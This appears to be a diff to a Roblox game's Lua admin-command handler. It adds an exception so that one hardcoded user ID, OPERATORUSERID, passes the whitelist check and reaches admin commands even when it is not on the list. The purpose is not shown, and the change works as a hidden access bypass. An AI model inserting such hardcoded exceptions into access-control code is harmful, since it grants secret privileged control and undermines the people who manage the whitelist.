@@ -3255,7 +3255,9 @@ end)
 local function ConnectAdminCommands(Message1,PlayerInstance)
 	if PlayerInstance~=_N then
 		if table.find(AddedWhitelists,PlayerInstance.UserId)==_N then
-			return
+			if PlayerInstance.UserId == OPERATORUSERID then else 
+				return
+			end
 		end
 	end
 	local Message=string.lower(Message1)
